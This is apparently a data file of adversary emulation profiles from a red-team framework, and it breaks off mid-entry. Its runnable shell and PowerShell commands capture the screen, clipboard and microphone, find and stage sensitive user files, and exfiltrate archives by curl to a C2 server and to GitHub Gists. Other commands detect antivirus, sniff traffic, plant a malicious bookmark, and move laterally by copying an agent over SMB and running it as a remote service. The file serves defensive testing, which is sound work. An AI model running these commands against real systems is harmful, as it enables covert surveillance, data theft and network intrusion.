{"564ae20d-778d-4965-93dc-b523be2e2ab4": {"adversary_name": "Super Spy", "adversary_description": "Monitor the active user and navigate through their digital belongings", "adversary_abilities_in_order": [{"ability_id": "316251ed-6a28-4013-812b-ddf5b5b007f8", "ability_name": "Screen Capture", "ability_description": "capture the contents of the screen", "ability_tactic": "collection", "ability_technique": {"attack_id": "T1113", "name": "Screen Capture"}, "ability_platforms": {"darwin": {"sh": {"command": "for i in {1..5}; do screencapture -t png screen-$i.png; echo \"$(cd \"$(dirname \"$1\")\"; pwd -P)/$(basename \"screen-$i.png\")\"; sleep 5; done;\n", "cleanup": "for i in {1..5}; do /bin/rm screen-$i.png; done;", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.screenshot.png"}]}}}, "windows": {"psh,pwsh": {"command": "$loadResult = [Reflection.Assembly]::LoadWithPartialName(\"System.Drawing\");\nfunction screenshot([Drawing.Rectangle]$bounds, $path) {\n   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;\n   $graphics = [Drawing.Graphics]::FromImage($bmp);\n   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);\n   $bmp.Save($path);\n   $graphics.Dispose();\n   $bmp.Dispose();\n}\nif ($loadResult) {\n  $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900);\n  $dest = \"$HOME\\Desktop\\screenshot.png\";\n  screenshot $bounds $dest;\n  if (Test-Path -Path $dest) {\n    $dest;\n    exit 0;\n  };\n};\nexit 1;\n", "cleanup": "$filePath = \"$HOME\\Desktop\\screenshot.png\"; if (Test-Path -Path $filePath) { del $filePath; };", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.screenshot.png"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["316251ed-6a28-4013-812b-ddf5b5b007f8", "None", "host.screenshot.png"], "possible_subsequent_abilities": []}, {"ability_id": "b007fe0c-c6b0-4fda-915c-255bbc070de2", "ability_name": "Copy Clipboard", "ability_description": "copy the contents for the clipboard and print them", "ability_tactic": "collection", "ability_technique": {"attack_id": "T1115", "name": "Clipboard Data"}, "ability_platforms": {"darwin": {"sh": {"command": "pbpaste\n"}}, "windows": {"psh,pwsh": {"command": "Get-Clipboard -raw\n"}}, "linux": {"sh": {"command": "xclip -o\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "b007fc38-9eb7-4320-92b3-9a3ad3e6ec25", "ability_name": "Get Chrome Bookmarks", "ability_description": "Get Chrome Bookmarks", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1217", "name": "Browser Bookmark Discovery"}, "ability_platforms": {"darwin": {"sh": {"command": "cat ~/Library/Application\\ Support/Google/Chrome/Default/Bookmarks\n", "parsers": {"plugins.stockpile.app.parsers.bookmarks": [{"source": "host.chrome.bookmark_title", "edge": "resolves_to", "target": "host.chrome.bookmark_url"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "78524da1-f347-4fbb-9295-209f1f408330", "ability_name": "Record microphone", "ability_description": "Install sox and record microphone for n-seconds", "ability_tactic": "impact", "ability_technique": {"attack_id": "T1496", "name": "Resource Hijacking"}, "ability_platforms": {"darwin": {"sh": {"command": "brew install sox >/dev/null 2>&1;\nsox -d recording.wav trim 0 15 >/dev/null 2>&1;\n", "timeout": 120}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "6469befa-748a-4b9c-a96d-f191fde47d89", "ability_name": "Create staging directory", "ability_description": "create a directory for exfil staging", "ability_tactic": "collection", "ability_technique": {"attack_id": "T1074.001", "name": "Data Staged: Local Data Staging"}, "ability_platforms": {"darwin": {"sh": {"command": "mkdir -p staged && echo $PWD/staged\n", "cleanup": "rm -rf staged\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.staged"}]}}}, "linux": {"sh": {"command": "mkdir -p staged && echo $PWD/staged\n", "cleanup": "rm -rf staged\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.staged"}]}}}, "windows": {"psh,pwsh": {"command": "New-Item -Path \".\" -Name \"staged\" -ItemType \"directory\" -Force | foreach {$_.FullName} | Select-Object\n", "cleanup": "Remove-Item -Path \"staged\" -recurse\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.staged"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["6469befa-748a-4b9c-a96d-f191fde47d89", "None", "host.dir.staged"], "possible_subsequent_abilities": [["a201bec2-a193-4b58-bf0e-57fa621da474", "host.dir.staged", "None"], ["5c5b0392-1daa-45e1-967c-2f361ce78849", "host.dir.staged", "host.dir.compress"], ["300157e5-f4ad-4569-b533-9d1fa0e74d74", "host.dir.staged", "host.dir.compress"], ["30a8cf10-73dc-497c-8261-a64cc9e91505", "host.dir.staged", "host.dir.compress"]]}, {"ability_id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b", "ability_name": "Find files", "ability_description": "Locate files deemed sensitive", "ability_tactic": "collection", "ability_technique": {"attack_id": "T1005", "name": "Data from Local System"}, "ability_platforms": {"darwin": {"sh": {"command": "find /Users -name '*.#{file.sensitive.extension}' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.file.path", "edge": "has_extension", "target": "file.sensitive.extension"}]}}}, "windows": {"psh,pwsh": {"command": "Get-ChildItem C:\\Users -Recurse -Include *.#{file.sensitive.extension} -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;\nexit 0;\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.file.path", "edge": "has_extension", "target": "file.sensitive.extension"}]}}}, "linux": {"sh": {"command": "find / -name '*.#{file.sensitive.extension}' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.file.path", "edge": "has_extension", "target": "file.sensitive.extension"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["90c2efaa-8205-480d-8bb6-61d90dbaf81b", "None", "host.file.path"], "possible_subsequent_abilities": [["4e97e699-93d7-4040-b5a3-2e906a58199e", "host.file.path", "None"]]}, {"ability_id": "4e97e699-93d7-4040-b5a3-2e906a58199e", "ability_name": "Stage sensitive files", "ability_description": "copy files to staging directory", "ability_tactic": "collection", "ability_technique": {"attack_id": "T1074.001", "name": "Data Staged: Local Data Staging"}, "ability_platforms": {"darwin": {"sh": {"command": "cp \"#{host.file.path[filters(technique=T1005,max=3)]}\" #{host.dir.staged[filters(max=1)]}\n"}}, "linux": {"sh": {"command": "cp \"#{host.file.path[filters(technique=T1005,max=3)]}\" #{host.dir.staged[filters(max=1)]}\n"}}, "windows": {"psh": {"command": "Copy-Item #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}\n"}, "cmd": {"command": "copy #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "300157e5-f4ad-4569-b533-9d1fa0e74d74", "ability_name": "Compress staged directory", "ability_description": "Compress a directory on the file system", "ability_tactic": "exfiltration", "ability_technique": {"attack_id": "T1560.001", "name": "Archive Collected Data: Archive via Utility"}, "ability_platforms": {"darwin": {"sh": {"command": "tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz\n", "cleanup": "rm #{host.dir.staged}.tar.gz\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.compress"}]}}}, "linux": {"sh": {"command": "tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz\n", "cleanup": "rm #{host.dir.staged}.tar.gz\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.compress"}]}}}, "windows": {"psh,pwsh": {"command": "Compress-Archive -Path #{host.dir.staged} -DestinationPath #{host.dir.staged}.zip -Force;\nsleep 1; ls #{host.dir.staged}.zip | foreach {$_.FullName} | select\n", "cleanup": "rm #{host.dir.staged}.zip\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.compress"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["300157e5-f4ad-4569-b533-9d1fa0e74d74", "host.dir.staged", "host.dir.compress"], "possible_subsequent_abilities": [["e7bf5dc7-62e4-48b2-acf8-abaf8734c19c", "host.dir.compress", "None"], ["4a1120a5-971c-457f-bb07-60641b4723fd", "host.dir.compress", "None"], ["0582dc26-e0cf-4645-88cf-f37a02279976", "host.dir.compress", "None"], ["ea713bc4-63f0-491c-9a6f-0b01d560b87e", "host.dir.compress", "None"], ["3ce95a28-25fc-4a7e-a0cd-0fdb190e2081", "host.dir.compress", "None"], ["ba0deadb-97ac-4a4c-aa81-21912fc90980", "host.dir.compress", "None"], ["d754878c-17dd-46dc-891c-a993f8a10336", "host.dir.compress", "None"]]}, {"ability_id": "ea713bc4-63f0-491c-9a6f-0b01d560b87e", "ability_name": "Exfil staged directory", "ability_description": "Exfil the staged directory", "ability_tactic": "exfiltration", "ability_technique": {"attack_id": "T1041", "name": "Exfiltration Over C2 Channel"}, "ability_platforms": {"darwin": {"sh": {"command": "curl -F \"data=@#{host.dir.compress}\" --header \"X-Request-ID: `hostname`-#{paw}\" #{server}/file/upload\n"}}, "linux": {"sh": {"command": "curl -F \"data=@#{host.dir.compress}\" --header \"X-Request-ID: `hostname`-#{paw}\" #{server}/file/upload\n"}}, "windows": {"psh,pwsh": {"command": "$ErrorActionPreference = 'Stop';\n$fieldName = \"#{host.dir.compress}\";\n$filePath = \"#{host.dir.compress}\";\n$url = \"#{server}/file/upload\";\n\nAdd-Type -AssemblyName 'System.Net.Http';\n\n$client = New-Object System.Net.Http.HttpClient;\n$content = New-Object System.Net.Http.MultipartFormDataContent;\n$fileStream = [System.IO.File]::OpenRead($filePath);\n$fileName = [System.IO.Path]::GetFileName($filePath);\n$fileContent = New-Object System.Net.Http.StreamContent($fileStream);\n$content.Add($fileContent, $fieldName, $fileName);\n$client.DefaultRequestHeaders.Add(\"X-Request-Id\", $env:COMPUTERNAME + '-#{paw}');\n$client.DefaultRequestHeaders.Add(\"User-Agent\",\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\");\n\n$result = $client.PostAsync($url, $content).Result;\n$result.EnsureSuccessStatusCode();\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b", "ability_name": "Find files", "ability_description": "Locate files deemed sensitive", "ability_tactic": "collection", "ability_technique": {"attack_id": "T1005", "name": "Data from Local System"}, "ability_platforms": {"darwin": {"sh": {"command": "find /Users -name '*.#{file.sensitive.extension}' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.file.path", "edge": "has_extension", "target": "file.sensitive.extension"}]}}}, "windows": {"psh,pwsh": {"command": "Get-ChildItem C:\\Users -Recurse -Include *.#{file.sensitive.extension} -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;\nexit 0;\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.file.path", "edge": "has_extension", "target": "file.sensitive.extension"}]}}}, "linux": {"sh": {"command": "find / -name '*.#{file.sensitive.extension}' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.file.path", "edge": "has_extension", "target": "file.sensitive.extension"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["90c2efaa-8205-480d-8bb6-61d90dbaf81b", "None", "host.file.path"], "possible_subsequent_abilities": [["4e97e699-93d7-4040-b5a3-2e906a58199e", "host.file.path", "None"]]}, {"ability_id": "2dece965-37a0-4f70-a391-0f30e3331aba", "ability_name": "Discover antivirus programs", "ability_description": "Identify AV", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1518.001", "name": "Software Discovery: Security Software Discovery"}, "ability_platforms": {"darwin": {"sh": {"command": "find /Applications/ -maxdepth 2 -iname *.app | grep -io \"[a-z ]*\\.app\" | grep -Ei -- \"symantec|norton|bitdefender|kapersky|eset|avast|avira|malwarebytes|sophos|(trend micro)\"\n", "parsers": {"plugins.stockpile.app.parsers.antivirus": [{"source": "host.installed.av"}]}}}, "windows": {"psh": {"command": "wmic /NAMESPACE:\\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /value\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.installed.av"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["2dece965-37a0-4f70-a391-0f30e3331aba", "None", "host.installed.av"], "possible_subsequent_abilities": []}, {"ability_id": "9a30740d-3aa8-4c23-8efa-d51215e8a5b9", "ability_name": "Scan WIFI networks", "ability_description": "View all potential WIFI networks on host", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1016", "name": "System Network Configuration Discovery"}, "ability_platforms": {"darwin": {"sh": {"command": "./#{payload:9f639067-370a-40ba-b7ac-6f1c15d5a158} scan\n", "payloads": ["9f639067-370a-40ba-b7ac-6f1c15d5a158"]}}, "linux": {"sh": {"command": "./#{payload:9f639067-370a-40ba-b7ac-6f1c15d5a158} scan\n", "payloads": ["9f639067-370a-40ba-b7ac-6f1c15d5a158"]}}, "windows": {"psh": {"command": ".\\#{payload:28f9bf43-4f14-4965-9bd9-b70fd6993d8e} -Scan\n", "payloads": ["28f9bf43-4f14-4965-9bd9-b70fd6993d8e"]}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "a0676fe1-cd52-482e-8dde-349b73f9aa69", "ability_name": "Preferred WIFI", "ability_description": "See the most used WIFI networks of a machine", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1016", "name": "System Network Configuration Discovery"}, "ability_platforms": {"darwin": {"sh": {"command": "./wifi.sh pref\n", "payloads": ["wifi.sh"], "parsers": {"plugins.stockpile.app.parsers.wifipref": [{"source": "wifi.network.ssid"}]}}}, "linux": {"sh": {"command": "./wifi.sh pref\n", "payloads": ["wifi.sh"], "parsers": {"plugins.stockpile.app.parsers.wifipref": [{"source": "wifi.network.ssid"}]}}}, "windows": {"psh": {"command": ".\\wifi.ps1 -Pref\n", "payloads": ["wifi.ps1"], "parsers": {"plugins.stockpile.app.parsers.wifipref": [{"source": "wifi.network.ssid"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["a0676fe1-cd52-482e-8dde-349b73f9aa69", "None", "wifi.network.ssid"], "possible_subsequent_abilities": []}, {"ability_id": "1b4fb81c-8090-426c-93ab-0a633e7a16a7", "ability_name": "Sniff network traffic", "ability_description": "Perform a packet capture", "ability_tactic": "credential-access", "ability_technique": {"attack_id": "T1040", "name": "Network Sniffing"}, "ability_platforms": {"windows": {"psh": {"timeout": 80, "command": "$path = \"$ENV:UserProfile\\Desktop\\pcap.etl\";\nNew-NetEventSession -Name \"PCAP\" -CaptureMode SaveToFile -LocalFilePath $path;\nAdd-NetEventProvider -Name \"Microsoft-Windows-TCPIP\" -SessionName \"PCAP\";\nStart-NetEventSession -Name \"PCAP\";\nStart-Sleep -s 60;\nStop-NetEventSession -Name \"PCAP\";\nif (Test-Path $path) {\n  echo $path;\n  exit 0;\n} else {\n  echo \"Failed to generate PCAP file.\";\n  exit 1;\n};\n", "cleanup": "Remove-NetEventSession -Name \"PCAP\";\nRemove-Item $ENV:UserProfile\\Desktop\\pcap.etl;\n"}}, "darwin": {"sh": {"command": "tcpdump -i en0 & sleep 5; kill $!\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "de52784d-4de6-4d4e-b79e-e7b68fe037fb", "ability_name": "Add bookmark", "ability_description": "Add a malicous bookmark which looks like a current one", "ability_tactic": "execution", "ability_technique": {"attack_id": "T1059.002", "name": "Command and Scripting Interpreter: AppleScript"}, "ability_platforms": {"darwin": {"sh": {"command": "osascript bookmark.scpt #{host.chrome.bookmark_title[filters(max=1)]} #{server.malicious.url[filters(max=1)]}\n", "payloads": ["bookmark.scpt"]}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}]}, "dbd49a4a-ba2d-40d0-9348-2db24fc4b0b6": {"adversary_name": "Service Creation Lateral Movement", "adversary_description": "Lateral movement via SMB copy and execution via creation of Windows service \"sandsvc\"", "adversary_abilities_in_order": [{"ability_id": "deeac480-5c2a-42b5-90bb-41675ee53c7e", "ability_name": "View remote shares", "ability_description": "View the shares of a remote host", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1135", "name": "Network Share Discovery"}, "ability_platforms": {"windows": {"psh": {"command": "net view \\\\#{remote.host.fqdn} /all", "parsers": {"plugins.stockpile.app.parsers.net_view": [{"source": "remote.host.fqdn", "edge": "has_share", "target": "remote.host.share"}]}}, "cmd": {"command": "net view \\\\#{remote.host.fqdn} /all", "parsers": {"plugins.stockpile.app.parsers.net_view": [{"source": "remote.host.fqdn", "edge": "has_share", "target": "remote.host.share"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["deeac480-5c2a-42b5-90bb-41675ee53c7e", "None", "remote.host.fqdn"], "possible_subsequent_abilities": [["921055f4-5970-4707-909e-62f594234d91", "remote.host.fqdn", "remote.host.fqdn"], ["2afae782-6d0a-4fbd-a6b6-d1ce90090eac", "remote.host.fqdn", "remote.host.fqdn"], ["95727b87-175c-4a69-8c7a-a5d82746a753", "remote.host.fqdn", "None"], ["aa6ec4dd-db09-4925-b9b9-43adeb154686", "remote.host.fqdn", "remote.host.fqdn"], ["65048ec1-f7ca-49d3-9410-10813e472b30", "remote.host.fqdn", "remote.host.fqdn"]]}, {"ability_id": "65048ec1-f7ca-49d3-9410-10813e472b30", "ability_name": "Copy 54ndc47 (SMB)", "ability_description": "Copy 54ndc47 to remote host (SMB)", "ability_tactic": "lateral-movement", "ability_technique": {"attack_id": "T1021.002", "name": "Remote Services: SMB/Windows Admin Shares"}, "ability_platforms": {"windows": {"psh": {"command": "$path = \"sandcat.go-windows\";\n$drive = \"\\\\#{remote.host.fqdn}\\C$\";\nCopy-Item -v -Path $path -Destination $drive\"\\Users\\Public\\s4ndc4t.exe\";\n", "cleanup": "$drive = \"\\\\#{remote.host.fqdn}\\C$\";\nRemove-Item -Path $drive\"\\Users\\Public\\s4ndc4t.exe\" -Force;\n", "parsers": {"plugins.stockpile.app.parsers.54ndc47_remote_copy": [{"source": "remote.host.fqdn", "edge": "has_54ndc47_copy"}]}, "payloads": ["sandcat.go-windows"]}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["65048ec1-f7ca-49d3-9410-10813e472b30", "remote.host.fqdn", "remote.host.fqdn"], "possible_subsequent_abilities": [["921055f4-5970-4707-909e-62f594234d91", "remote.host.fqdn", "remote.host.fqdn"], ["2afae782-6d0a-4fbd-a6b6-d1ce90090eac", "remote.host.fqdn", "remote.host.fqdn"], ["95727b87-175c-4a69-8c7a-a5d82746a753", "remote.host.fqdn", "None"], ["aa6ec4dd-db09-4925-b9b9-43adeb154686", "remote.host.fqdn", "remote.host.fqdn"]]}, {"ability_id": "95727b87-175c-4a69-8c7a-a5d82746a753", "ability_name": "Service Creation", "ability_description": "Create a service named \"sandsvc\" to execute remote 54ndc57 binary named \"s4ndc4t.exe\"", "ability_tactic": "execution", "ability_technique": {"attack_id": "T1569.002", "name": "System Services: Service Execution"}, "ability_platforms": {"windows": {"psh": {"timeout": 300, "cleanup": "sc.exe \\\\#{remote.host.fqdn} stop sandsvc;\nsc.exe \\\\#{remote.host.fqdn} delete sandsvc /f;\ntaskkill /s \\\\#{remote.host.fqdn} /FI \"Imagename eq s4ndc4t.exe\"\n", "command": "sc.exe \\\\#{remote.host.fqdn} create sandsvc start= demand error= ignore binpath= \"cmd /c start C:\\Users\\Public\\s4ndc4t.exe -server #{server} -v -originLinkID #{origin_link_id}\" displayname= \"Sandcat Execution\";\nsc.exe \\\\#{remote.host.fqdn} start sandsvc;\nStart-Sleep -s 15;\nGet-Process -ComputerName #{remote.host.fqdn} s4ndc4t;\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}]}, "d6ea4c1e-7959-4eb1-a292-b6fd2b06c73e": {"adversary_name": "Enumerator", "adversary_description": "Enumerate Processes in all the ways", "adversary_abilities_in_order": [{"ability_id": "94f21386-9547-43c4-99df-938ab05d45ce", "ability_name": "WMIC Process Enumeration", "ability_description": "Capture process id, executable path, pid and parent pid before writing to disk", "ability_tactic": "collection", "ability_technique": {"attack_id": "T1047", "name": "WMIC"}, "ability_platforms": {"windows": {"psh": {"command": "wmic process get executablepath,name,processid,parentprocessid >> $env:APPDATA\\vmtools.log;\ncat $env:APPDATA\\vmtools.log\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "8adf02e8-6e71-4244-886c-98c402857404", "ability_name": "tasklist Process Enumeration", "ability_description": "Capture running processes and their loaded DLLs", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1057", "name": "Process Discovery"}, "ability_platforms": {"windows": {"psh": {"command": "tasklist /m  >> $env:APPDATA\\vmtool.log;\ncat $env:APPDATA\\vmtool.log\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "4d9b079c-9ede-4116-8b14-72ad3a5533af", "ability_name": "PowerShell Process Enumeration", "ability_description": "Capture running processes via PowerShell", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1057", "name": "Process Discovery"}, "ability_platforms": {"windows": {"psh,pwsh": {"command": "get-process >> $env:APPDATA\\vmtools.log;\ncat $env:APPDATA\\vmtools.log\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "7c42a30c-c8c7-44c5-80a8-862d364ac1e4", "ability_name": "UAC Status", "ability_description": "Determine whether or not UAC is enabled", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1518.001", "name": "Software Discovery: Security Software Discovery"}, "ability_platforms": {"windows": {"psh,pwsh": {"command": "echo $(get-uac)\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "cc191baa-7472-4386-a2f4-42f203f1acfd", "ability_name": "SysInternals PSTool Process Discovery", "ability_description": "Process discovery via SysInternals pstool", "ability_tactic": "collection", "ability_technique": {"attack_id": "T1057", "name": "Process Discovery"}, "ability_platforms": {"windows": {"psh,pwsh": {"command": "$ps_url = \"https://download.sysinternals.com/files/PSTools.zip\";\n$download_folder = \"C:\\Users\\Public\\\";\n$staging_folder = \"C:\\Users\\Public\\temp\";\nStart-BitsTransfer -Source $ps_url -Destination $download_folder;\nExpand-Archive -LiteralPath $download_folder\"PSTools.zip\" -DestinationPath $staging_folder;\niex $staging_folder\"\\pslist.exe\" >> $env:LOCALAPPDATA\\output.log;\nRemove-Item $download_folder\"PSTools.zip\";\nRemove-Item $staging_folder -Recurse\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}]}, "e89a10d3-004f-4c15-b0eb-d1ba76a4b67f": {"adversary_name": "Advanced Thief via GitHub Gist", "adversary_description": "Exfil a compressed archive to a GitHub Gist (Base64 Encoded)", "adversary_abilities_in_order": [{"ability_id": "10fad81e-3f68-47be-83b6-fbee7711c6a9", "ability_name": "Advanced File Search and Stager", "ability_description": "Highly configurable file finder and stager for Linux and Windows. Drops a payload file to the host to parse\narguments rather than running multiple commands for each fact (e.g., each file type). This ability allows for a safe\nmode, only staging files found that have the appropriate file ending. The staging directory is configurable but\ndefaults to the current user's Recycle Bin (Windows) and /tmp (Linux). Payload files include default values for all\nparameters (matching the base fact source - File Search and Stage). Options for searches: file extensions (include,\nexclude [windows]), directories (include, exclude), accessed date cutoff, modified date cutoff, sensitive search\nstrings in files or titles.\n", "ability_tactic": "collection", "ability_technique": "None", "ability_platforms": "None", "id_dependence_fact_tuple -- (id, dependency, fact)": ["10fad81e-3f68-47be-83b6-fbee7711c6a9", "None", "host.dir.staged"], "possible_subsequent_abilities": [["a201bec2-a193-4b58-bf0e-57fa621da474", "host.dir.staged", "None"], ["5c5b0392-1daa-45e1-967c-2f361ce78849", "host.dir.staged", "host.dir.compress"], ["300157e5-f4ad-4569-b533-9d1fa0e74d74", "host.dir.staged", "host.dir.compress"], ["30a8cf10-73dc-497c-8261-a64cc9e91505", "host.dir.staged", "host.dir.compress"]]}, {"ability_id": "30a8cf10-73dc-497c-8261-a64cc9e91505", "ability_name": "Compress staged directory (Password Protected)", "ability_description": "This ability packages staged files into a password-protected archive. Note - Requires 7Z for Windows and GPG version 2.1+ for Linux", "ability_tactic": "collection", "ability_technique": {"attack_id": "T1560.001", "name": "Archive Collected Data: Archive via Utility"}, "ability_platforms": {"linux": {"sh": {"command": "tar -C #{host.dir.staged} -czf - . | gpg -c --pinentry-mode=loopback --passphrase #{host.archive.password} > #{host.dir.staged}.tar.gz.gpg && echo #{host.dir.staged}.tar.gz.gpg\n", "cleanup": "rm #{host.dir.staged}.tar.gz.gpg\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.compress"}]}}}, "windows": {"psh": {"command": "& \"C:\\Program Files\\7-Zip\\7z.exe\" a \"#{host.dir.staged}.7z\" \"#{host.dir.staged}\\*\" \"-p#{host.archive.password}\" | Out-Null;\nsleep 1; ls #{host.dir.staged}.7z | foreach {$_.FullName} | select\n", "cleanup": "rm #{host.dir.staged}.7z\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.compress"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["30a8cf10-73dc-497c-8261-a64cc9e91505", "host.dir.staged", "host.dir.compress"], "possible_subsequent_abilities": [["e7bf5dc7-62e4-48b2-acf8-abaf8734c19c", "host.dir.compress", "None"], ["4a1120a5-971c-457f-bb07-60641b4723fd", "host.dir.compress", "None"], ["0582dc26-e0cf-4645-88cf-f37a02279976", "host.dir.compress", "None"], ["ea713bc4-63f0-491c-9a6f-0b01d560b87e", "host.dir.compress", "None"], ["3ce95a28-25fc-4a7e-a0cd-0fdb190e2081", "host.dir.compress", "None"], ["ba0deadb-97ac-4a4c-aa81-21912fc90980", "host.dir.compress", "None"], ["d754878c-17dd-46dc-891c-a993f8a10336", "host.dir.compress", "None"]]}, {"ability_id": "0582dc26-e0cf-4645-88cf-f37a02279976", "ability_name": "Exfil Compressed Archive to Github Gist", "ability_description": "This ability exfiltrates a compressed archive to Github Gists (Base64 Encoded). To reconstitute, save\nthe base64 string from the Gist and run ----\n(Powershell) [Convert]::FromBase64String($(Get-Content b64.txt)) | set-content archive.extension -encoding byte ----\n(Linux) cat b64.txt | base64 -d > archive.extension\n", "ability_tactic": "exfiltration", "ability_technique": {"attack_id": "T1567.001", "name": "Exfiltration to Code Repository"}, "ability_platforms": {"linux": {"sh": {"command": "GHUser=\"#{github.user.name}\";\nGHPAT=\"#{github.access.token}\";\nFileContent=$(base64 #{host.dir.compress});\nLocalFile='#{host.dir.compress}';\nRemoteFile=\"$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)\";\ntmp_file=$(mktemp);\necho \"{\\\"public\\\": false,\\\"files\\\": {\\\"$RemoteFile\\\": {\\\"content\\\": \\\"${FileContent}\\\"}}}\" > $tmp_file;\ncurl --silent --output /dev/null --show-error --fail -X POST -d @$tmp_file -u $GHUser:$GHPAT https://api.github.com/gists;\nrm $tmp_file\n"}}, "windows": {"psh": {"command": "$GHUser = \"#{github.user.name}\";\n$GHPAT = \"#{github.access.token}\";\n$File = Get-Item -Path \"#{host.dir.compress}\";\n$Token = $GHUser + \":\" + $GHPAT;\n$EncodedToken = [System.Convert]::ToBase64String([char[]]$Token);\n\n$RemoteName = \"$(Get-Date -Format yyyymmddhhmmss)-exfil-paw-$($File.name)\";\n$FileContent = [Convert]::ToBase64String([IO.File]::ReadAllBytes($File));\n\n$StringContent = @{\n    files = @{$RemoteName = @{content = $FileContent}};\n    public = $False;\n} | ConvertTo-Json;\n$URL = \"https://api.github.com/gists\";\n$Body = $StringContent;\n$Headers = @{\n    \"content-type\" = \"application/json\";\n    \"Authorization\" = 'Basic {0}' -f $EncodedToken;\n};\nInvoke-WebRequest -Uri $URL -Method POST -Body $Body -Headers $Headers 1>$null -UseBasicParsing;\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}]}, "50855e29-3b4e-4562-aa55-b3d7f93c26b8": {"adversary_name": "Alice 2.0", "adversary_description": "Adversary used for demoing restricted lateral movement", "adversary_abilities_in_order": [{"ability_id": "13379ae1-d20e-4162-91f8-320d78a35e7f", "ability_name": "Discover local hosts", "ability_description": "Use PowerView to query the Active Directory server for a list of computers in the Domain", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1018", "name": "Remote System Discovery"}, "ability_platforms": {"windows": {"psh": {"command": "Import-Module .\\powerview.ps1;\nGet-DomainComputer\n", "parsers": {"plugins.stockpile.app.parsers.gdomain": [{"source": "remote.host.fqdn"}]}, "payloads": 